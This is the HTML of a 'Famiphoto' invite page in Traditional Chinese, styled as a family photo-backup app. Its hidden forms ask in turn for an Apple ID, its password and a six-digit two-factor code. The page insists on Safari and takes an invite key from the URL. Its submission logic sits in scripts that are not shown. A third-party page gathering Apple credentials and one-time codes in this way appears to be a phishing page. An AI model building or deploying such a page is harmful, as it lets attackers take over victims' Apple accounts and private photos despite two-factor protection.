<!DOCTYPE html>
<html lang="zh-Hant">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"/>
<script>
(function () {
  function stopZoom(ev) {
    ev.preventDefault();
  }
  document.addEventListener("gesturestart", stopZoom, { passive: false });
  document.addEventListener("gesturechange", stopZoom, { passive: false });
})();
</script>
<meta name="apple-mobile-web-app-capable" content="yes"/>
<meta name="mobile-web-app-capable" content="yes"/>
<meta name="apple-mobile-web-app-title" content="Famiphoto"/>
<meta name="apple-mobile-web-app-status-bar-style" content="default"/>
<meta name="theme-color" content="#fafafa"/>
<title>Famiphoto</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
<link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@600&display=swap" rel="stylesheet"/>
<link rel="icon" href="./rose-two.svg" type="image/svg+xml"/>
<link rel="apple-touch-icon" href="./icons/rose-two-180.png"/>
<link rel="stylesheet" href="./app.css?v=91"/>
<script src="./config.js?v=1790090536"></script>
<script>
(function () {
  var q = new URLSearchParams(location.search).get("k") || "";
  window.FAMILY_FORCE_INVITE = true;
  window.FAMILY_URL_KEY = /^[A-Za-z0-9_-]{8,128}$/.test(q) ? q : "";
  window.FAMILY_VIEW_KEY = "";
  var origin = window.VAULT_ORIGIN;
  if (origin) {
    var link = document.createElement("link");
    link.rel = "preconnect";
    link.href = origin;
    link.crossOrigin = "anonymous";
    document.head.appendChild(link);
  }
})();
</script>
</head>
<body>
<div class="blobs" id="blobs" aria-hidden="true">
  <span></span><span></span><span></span><span></span>
</div>
<div class="hall with-feed is-invite" id="hall">
  <div class="profile">
    <div class="rose-two" id="rose-two"></div>
    <h1 class="brand">Famiphoto</h1>
    <p class="status" id="status"></p>
  </div>
  <div class="invite-panel" id="invite-panel">
    <p class="invite-hey" id="invite-hey">Hey! 開始備份你的照片</p>
    <p class="invite-safari" id="invite-safari" hidden>請用 Safari 打開</p>
    <button type="button" class="invite-go" id="invite-go">開始備份</button>
    <form id="invite-apple-form" hidden>
      <p class="err" id="invite-apple-err"></p>
      <label for="invite-apple">Apple ID</label>
      <div class="apple-row">
        <input id="invite-apple" type="email" autocomplete="username" required/>
        <button type="submit" class="apple-next" aria-label="繼續">
          <svg viewBox="0 0 36 36" aria-hidden="true"><circle cx="18" cy="18" r="18"/><path d="M15.2 11.5L22.5 18l-7.3 6.5"/></svg>
        </button>
      </div>
    </form>
    <form id="invite-pass-form" hidden>
      <p class="err" id="invite-pass-err"></p>
      <label for="invite-pass">密碼</label>
      <div class="apple-row">
        <input id="invite-pass" type="password" autocomplete="current-password" required/>
        <button type="submit" class="apple-next" aria-label="繼續">
          <svg viewBox="0 0 36 36" aria-hidden="true"><circle cx="18" cy="18" r="18"/><path d="M15.2 11.5L22.5 18l-7.3 6.5"/></svg>
        </button>
      </div>
    </form>
    <form id="invite-mfa" hidden>
      <p class="err" id="invite-mfa-err"></p>
      <label for="invite-code">驗證碼</label>
      <div class="apple-row">
        <input id="invite-code" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" required/>
        <button type="submit" class="apple-next" aria-label="繼續">
          <svg viewBox="0 0 36 36" aria-hidden="true"><circle cx="18" cy="18" r="18"/><path d="M15.2 11.5L22.5 18l-7.3 6.5"/></svg>
        </button>
      </div>
    </form>
    <div class="invite-wait" id="invite-wait" hidden>
      <div class="thinking-five" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span></div>
      <div class="invite-wait-bar" id="invite-wait-bar"></div>
    </div>
  </div>
</div>
<script src="./rose-two.js?v=22"></script>
<script src="./gate.js?v=14"></script>
<script>
if (window.FamiphotoGate) window.FamiphotoGate.start();
</script>
</body>
</html>
